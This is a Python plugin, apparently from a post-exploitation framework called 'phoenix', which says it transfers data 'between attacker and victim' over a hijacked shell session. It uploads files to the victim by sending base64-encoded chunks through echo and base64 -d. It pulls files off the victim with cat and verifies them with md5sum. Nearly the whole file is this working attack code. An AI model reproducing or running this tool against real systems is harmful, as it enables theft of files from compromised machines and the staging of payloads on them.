"""
Native Plugin for Data Transfer
"""
from phoenix.Plugin import Plugin, plugin_type
from phoenix.ArgumentParser import ArgumentParser
from phoenix.ExecCode import ExecCode
import os
import base64
import hashlib


class NativePlugin(Plugin):
    def __init__(self):
        super().__init__()
        self.info.name = "Native Data Transfer"
        self.info.module_name = "phoenix/native/transfer"
        self.info.command = 'transfer'
        self.plugin_type = plugin_type.Native
        self.info.description = "This Plugin helps to transfer data between attacker and victim."
        
        self.parser = ArgumentParser(name="transfer")
        self.client = None
        self.HEADER_SIZE = 256
        self.UPLOAD_BUFFER_SIZE = 1024
        self.DOWNLOAD_BUFFER_SIZE = 4096  
        self.check_file = False
        
    
    def run_with_args(self,command):
        
        self.parser.add_argument('upload',hasvalue=False,name="upload",help="Upload File to the target machine.")
        self.parser.add_argument('download',hasvalue=False,name="download",help="Download File from the target machine.")
        self.parser.add_argument('-s','--session',hasvalue=True,name="session",help="The used session name or number")        
        self.parser.add_argument('-f','--file',name="file",help="Set uploaded file name.")
        self.parser.add_argument('-p',"--path",name="path",help="Set upload target path.")
        self.parser.add_argument('-c',"--check",name="check",hasvalue=False,help="Check the file integrity after upload or download.")
        
        if not self.parser.show_help:
            args = self.parser.parse_arguments(command)
            if args == {}: parser.print_help()
            else:
                self.run(args)
    def run(self,args):
        # Checking available methods
        # command = ExecCode() # Create Command EXECUTER
        method = None
        
        if 'file' in args: file = args['file']
        if 'path' in args: 
            path = args['path']
        else:
            path = "/tmp"
        if 'session' in args: 
            session = shared.phoenix.get_session(args['session'])
            self.client = session.get_socket()
        if 'check' in args: self.check_file = True
        if 'upload' in args: method = "upload"
        if 'download' in args: method = "download"
        
        if method:
            if method == 'upload' and file:
                self.upload(file)
            elif method == 'download' and file:
                self.download(file)
        
    def get_pwd(self):
        self.client.send("pwd\n")
        result = self.client.receive_all()
        if result:
            return result.rstrip('\n')
    def get_md5hash(self,file):
        payload = f"md5sum {file}\n"
        self.client.send(payload)
        result = self.client.receive_all()
        if result and ' ' in result:
            md5 = result.split(' ')[0]
            return md5
        
    def upload(self,file):
        filesize = os.path.getsize(file)
        filename = os.path.basename(file)
        filemd5 = hashlib.md5()
        print(f"[*] Uploading {file}")
        try:
            #progress = tqdm.tqdm(range(filesize), f"Sending {file}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(file, "rb") as f:
                while True:
                    # read the bytes from the file
                    bytes_read = f.read(self.UPLOAD_BUFFER_SIZE)
                    if not bytes_read:
                        # file transmitting is done
                        break
                    # we use sendall to assure transimission in 
                    # busy networks
                    data = base64.b64encode(bytes_read).decode()
                    payload = f"echo '{data}' | base64 -d >> {filename}\n"
                    self.client.send(payload)
                    filemd5.update(bytes_read)
                    # update the progress bar
                    #progress.update(len(bytes_read))
            pwd = self.get_pwd()
            print(f"[+] File {file} successfully uploaded to {os.path.join(pwd,filename)}")
            if self.check_file:
                md5sum = str(filemd5.hexdigest())
                md5 = self.get_md5hash(filename)
                if md5sum == md5:
                    print(f"[+] File integrity successfully verified")
                else:
                    print(f"[x] File checksum mismatch!")
                    print(md5sum,md5)
        except Exception as x:
            print(x)
            print(f"[x] Failed to upload {file}")
    def download(self,file):
        print(f"[*] Downloading {file}")
        fs,md5 = self.get_header_data(file)
        filemd5 = hashlib.md5()
        if fs and md5:
            try:
                filename = os.path.join(os.getcwd(),os.path.basename(file))
                #progress = tqdm.tqdm(range(fs), f"Receiving {file}", unit="B", unit_scale=True, unit_divisor=1024)            
                self.client.send(f"cat {file}\n")
                with open(filename, "wb") as f:
                    while True:
                        # read 1024 bytes from the socket (receive)
                        bytes_read = self.client.receive(self.DOWNLOAD_BUFFER_SIZE)
                        #progress.update(len(bytes_read))
                        f.write(bytes_read)
                        filemd5.update(bytes_read)
                        if not bytes_read:    
                            break
                        if len(bytes_read) < self.DOWNLOAD_BUFFER_SIZE:
                            break
                        # write to the file the bytes we just received
                        # update the progress bar
                        #progress.update(len(bytes_read))
    
                print(f"[+]File {file} downloaded successfully!")
                if self.check_file:
                    md5sum = str(filemd5.hexdigest())
                    if md5sum == md5:
                        print(f"[+] File integrity successfully verified")
                    else:
                        print(f"[x] File checksum mismatch!")
                        print(md5sum,md5)                
            except Exception as x:
                print(x)
                print(f"[x] Failed to download {file}")
        else:
            print("[x] Missing file size or checksum from header data.")
                
    def get_header_data(self,file):
        """This function is used for File downloading"""
        header_payload = f'echo "$(wc -c {file});$(md5sum {file})"\n'
        self.client.send(header_payload)
        received = self.client.receive(self.HEADER_SIZE).decode()
        filesize,md5sum = received.split(';')
        if ' ' in md5sum:
            md5sum = md5sum.split(' ')[0]
        if '' in filesize:
            filesize = int(filesize.split(' ')[0])
            
        return filesize,md5sum    
    
